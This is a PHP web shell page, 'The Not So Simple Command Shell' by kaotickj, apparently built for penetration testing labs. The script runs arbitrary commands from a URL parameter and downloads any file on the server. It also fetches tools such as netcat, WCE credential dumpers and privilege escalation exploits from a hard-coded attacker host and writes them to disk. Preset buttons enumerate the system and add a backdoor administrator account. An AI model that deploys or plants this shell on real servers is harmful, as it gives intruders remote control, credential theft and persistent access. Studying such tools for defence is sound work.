<!doctype html>
<html lang="en">
<head>
<title>The Not-So SImple Command Shell by kaotickj</title>
</head>
<body>
<div style="margin:0px 40px;">
<h4 style="">The Not So Simple Command Shell</h4>
<?php 
$attackip = "10.0.2.6";
$attackport = "8000";

echo '<form action="" method="get">Command? <input type="text" name="cmd" autofocus/>
<button type="submit">execute</button></form>
<br>
<form action="" method="get">
<select name="upload">
<option value="DRWransomWareDecryptor.exe">DRW Ransomware Decryptor</option>
<option value="jaws-enum.ps1">JAWs Enum</option>
<option value="ms15-05164.exe">MS15-051 Priv Esc</option>
<option value="nc.exe">Netcat 32</option>
<option value="nc64.exe">Netcat 64</option>
<option value="PsExec.exe">PsExec</option>
<option value="PsInfo.exe">PsInfo</option>
<option value="pspasswd.exe">PsPasswd</option>
<option value="PowerUp.ps1">PowerUp.ps1</option>
<option value="RansomwareFileDecryptor.exe">Ransomware File Decryptor (TrendMicro)</option>
<option value="Taihou64.exe">Taihou 15-1701 PrivEsc</option>
<option value="venom.exe">VENOM.EXE</option>
<option value="wce32.exe">WCE 32</option>
<option value="wce64.exe">WCE 64</option>
<option value="wce-universal.exe">WCE Universal</option>
</select>
<button type="submit">upload</button>
</form>
<p><or enter filename></p>
<form action="" method="get" enctype="multipart/form-data"><input name="upload" type="file" placeholder="File to Upload"/><button type="submit">upload</button></form>&nbsp;<form action="" method="get"><input type="text" name="path" placeholder="File to Download"/><button type="submit" title="downloads file to attack machine">download</button></form>
<br>
<form action="" method="get">

Quick Enum Options<br>
<button type="submit" name="cmd" value="systeminfo">System Info</button>&nbsp;<button type="submit" name="cmd" value="whoami">Whoami</button>&nbsp<button type="submit" name="cmd" value="echo %username%" title="on older systems gives username - hostname is returned on others">Username/Host</button>&nbsp;<button type="submit" name="cmd" value="whoami /all">CurrentUserInfo</button>&nbsp;<button type="submit" name="cmd" value="net user">All Users</button><br><br><button type="submit" name="cmd" value="tasklist">Processes</button>&nbsp<button type="submit" name="cmd" value="net user kaotickj kali /add" title="adds user kaotickj with password kali">add user</button>&nbsp;<button type="submit" name="cmd" value="net localgroup administrators kaotickj /add" title="sets kaotickj as adminstrative user">NewUsertoAdmin</button>&nbsp;<button type="submit" name="cmd" value="net user kaotickj /del" title="deletes kaotickj from the system">DelUser</button>
<button type="submit" name="cmd" value="cls">Clear Console</button>
</form>
<p style=""><small>The Not-So Simple Command Shell - Courtesy of kaotickj</small></p>
</div>';


if(isset($_GET['path'])) {
$filename = $_GET['path'];
if(file_exists($filename)) {
header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header("Cache-Control: no-cache, must-revalidate");
header("Expires: 0");
header('Content-Disposition: attachment; filename="'.basename($filename).'"');
header('Content-Length: ' . filesize($filename));
header('Pragma: public');
flush();
readfile($filename);
die();
}
else{
echo "File does not exist.";
}
}

if (isset($_GET['upload'])) {
file_put_contents($_GET['upload'], file_get_contents("http://".$attackip.":".$attackport."/" .$_GET['upload']));
}

if (isset($_GET['cmd'])) {
echo '<pre>';
echo (system($_GET['cmd']));
echo '</pre>';
}
?>
</body>
</html>
